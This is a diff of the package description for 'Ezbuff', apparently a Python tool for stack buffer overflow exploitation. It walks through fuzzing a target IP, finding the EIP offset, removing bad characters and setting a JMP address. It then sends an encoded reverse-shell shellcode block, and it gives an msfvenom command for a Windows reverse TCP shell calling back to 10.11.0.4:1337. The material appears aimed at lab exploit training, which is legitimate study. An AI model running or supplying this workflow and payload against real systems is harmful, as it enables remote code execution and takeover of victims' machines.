@@ -24,9 +24,7 @@ Description: # Ezbuff
         	# Instanstantiate `Overflow` object
         	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)
         
-        	# to obtain details on the object you instantiated
-        	print(obj)
-        	# for more details
+        	# check object value
         	print(repr(obj))
         
         	# Change the target IP if running in interactive Python interpreter
@@ -44,6 +42,8 @@ Description: # Ezbuff
         	obj.fuzz_increment = 150
         
         	# Fuzz the vulnerable application
+        	# [!] watch your terminal to see the number of bytes send at each iteration
+        	#     and to obtain the number of bytes it took to crash the application
         	obj.fuzz()
         
         	# Sets the number of bytes to crash the application.
@@ -52,37 +52,51 @@ Description: # Ezbuff
         	obj.num_bytes_crash = 1500
         
         	# Sending pattern to determine offset
+        	# [*] the length of the pattern is determined by the `num_bytes_crash` property
+        	# 	  which is the number of bytes it took to crash the application plus the number
+        	#     of bytes you allocate for your shell code later on. This should require 
+        	#     an additional 300-400 bytes. Ex. During my test run it took around 800
         	obj.send_pattern()
         
-        	# Get offset 
-        	# offset = obj.get_offset("30416B30")
+        	# Get offset
+        	# pass in the value that overwrote the eip register and get offset
+        	offset = obj.get_offset("30416B30")
         	print(offset)
         
-        	# Set offset value after retrieving from function above
+        	# Set offset value after retrieving the offset from the function above
         	# [!] this should be set after running `get_offset` for the remainder of the process
         	obj.offset = 780
         
         	# Testing offset (obj.offset must be set from)
-        	# obj.test("offset")
+        	# [!] after run this you should see 4 B's (42424242) in the eip register
+        	obj.test("offset")
         
         	# Add bad characters to list containing bad characters found
         	# after sending string of characters
         	# [!] after sending a string of characters and finding a bad character
         	# 	  append the character as an argument to the function `add_bad_char`
-        	#	  as shown below
+        	#	  as shown below. Also note that the `add_bad_char` function should be invoked
+        	#     only after sending the initial bad characters payload.
         	obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
         
         	# Send payload with all characters to find bad characters.
+        	# [!] bad characters are removed depending on the characters passed
+        	#     as arguments to the `add_bad_char` function
         	obj.send_bad_chars()
         
         	# Set the memory address to jump to after finding valid memory address
         	# containing `jump` instructions set in x86 architecture
-        	# [!] the `jump_eip` must be bytes as shown below
+        	# [!] the `jump_eip` must be bytes as shown below (prefix string with b)
         	obj.jump_eip = b"\x83\x0c\x09\x10"
+        
+        	# test the the memory address that `jump_eip` was set to, most likely
+        	# the memory address of a .dll without ASLR or DEP proctections.
+        	# [!] do not forget to set a break point at the address specified for the `jump_eip`
+        	#     to see if memory address overwrote the eip register appropiately
         	obj.test("eip")
         
         	# reverse shell payload
-        	# [!] must be in bytes
+        	# [!] must be in bytes (prefix every line of the shell with a b)
         	shellcode = (
         b"\xbe\x88\xe8\x2f\x51\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
         b"\x52\x83\xc2\x04\x31\x72\x0e\x03\xfa\xe6\xcd\xa4\x06\x1e\x93"
@@ -109,16 +123,18 @@ Description: # Ezbuff
         b"\xef\x2d\xde\x17\x6c\xc7\x9f\xe3\x6c\xa2\x9a\xa8\x2a\x5f\xd7"
         b"\xa1\xde\x5f\x44\xc1\xca")
         	# `get_payload` takes a parameter which is the name of the reverse shell file you created with msfvenom
-        	# Don't forget to specify a format in c programming language
-        	# obj.send_payload(shellcode)
+        	# [*] Don't forget to set up your listener!
+        	obj.send_payload(shellcode)
         
         if __name__ == '__main__':
         	main()
-        	
-        # Sample payload with Msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=
-        # thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
+        ```
+        ## Generating payload
+        ```bash
+        # Sample payload with Msfvenom:
+         msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
         
-        # Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options! 
+        # Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options!
         ```
         
 Platform: UNKNOWN
